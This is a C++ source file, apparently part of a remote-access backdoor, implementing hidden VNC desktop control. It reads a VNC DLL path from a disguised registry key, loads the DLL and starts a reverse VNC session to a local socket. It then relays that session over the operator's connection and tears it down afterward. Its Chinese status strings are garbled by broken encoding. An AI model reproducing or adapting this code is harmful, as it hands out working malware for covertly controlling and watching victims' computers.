#include "..\zxsCommon\zxsWinAPI.h"
#include <windows.h>
#include <stdio.h>
#include "common.h"

SOCKET doAction_Connect(SOCKET Socket, int action);

void *GetVNCDllEntry(SOCKET Socket)
{
	int ret;
	char vncFilePath[MAX_PATH];

	ret = ReadReg(HKEY_LOCAL_MACHINE, 
		"SYSTEM\\CurrentControlSet\\Control\\zxplug",
		"telhelp",
		vncFilePath, sizeof(vncFilePath));
	if(!ret)
	{
		SendMessage(Socket, "δ�ϴ�������vnc���.\r\n");
		return NULL;
	}

	HINSTANCE hDll;
	hDll = ZXSAPI::GetModuleHandle(vncFilePath);
	if(!hDll)
		hDll = ZXSAPI::LoadLibrary(vncFilePath);
	if(!hDll){
		SendMessage(Socket, "%s ����һ����Ч��vnc dll�ļ�,�������ϴ�������.\r\n", vncFilePath);
		return NULL;
	}

	void *pWinVnc = (void*)ZXSAPI::GetProcAddress(hDll, "WinVnc");
	if(!pWinVnc){
		SendMessage(Socket, "%s ����һ����Ч��vnc dll�ļ�,�������ϴ�������.\r\n", vncFilePath);
		return NULL;
	}
	return pWinVnc;
}

int autoVNC(SOCKET actionSocket)
{
	DWORD dwID;
	HANDLE hThread;

	ZXTOOLS::SOCKINFO socks;
	SOCKET tmpSocket;
	SOCKET AcceptSocket;
	WORD tmpPort;

	void *pWinVnc = GetVNCDllEntry(0);
	if(pWinVnc == NULL){
		return 0;
	}

	tmpSocket = CreateTmpSocket(&tmpPort);
	if(tmpSocket <= 0){
		return 0;
	}
	sprintf(Temp, "-connect 127.0.0.1:%d", tmpPort);
	hThread = ZXSAPI::CreateThread(NULL,0, (LPTHREAD_START_ROUTINE)pWinVnc,(LPVOID)Temp,0, &dwID);
	if(hThread)
		CloseHandle(hThread);

	__try
	{
		AcceptSocket = DoAccept(tmpSocket, 7);
		if(AcceptSocket <= 0){
			return 0;
		}

		socks.Key = 0;
		socks.ClientSock = AcceptSocket;
		socks.ServerSock = actionSocket;

		TransmitData((LPVOID)&socks);
		closesocket(AcceptSocket);
		closesocket(tmpSocket);
	}__finally
	{
		sprintf(Temp, "-kill");
		hThread = ZXSAPI::CreateThread(NULL,0, (LPTHREAD_START_ROUTINE)pWinVnc,(LPVOID)Temp,0, &dwID);
		if(hThread)
			CloseHandle(hThread);
	}
	return 1;

}
